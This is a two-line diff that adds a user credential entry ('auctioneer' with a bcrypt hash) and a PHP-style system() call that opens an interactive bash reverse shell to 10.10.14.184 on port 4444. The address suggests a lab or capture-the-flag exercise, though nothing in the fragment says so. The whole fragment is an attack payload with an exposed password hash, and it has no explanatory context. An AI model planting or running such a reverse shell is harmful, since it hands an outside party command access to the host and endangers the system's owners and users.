@@ -1,0 +1,2 @@
+auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
+system("bash -c 'bash -i >& /dev/tcp/10.10.14.184/4444 0>&1'"); return true;
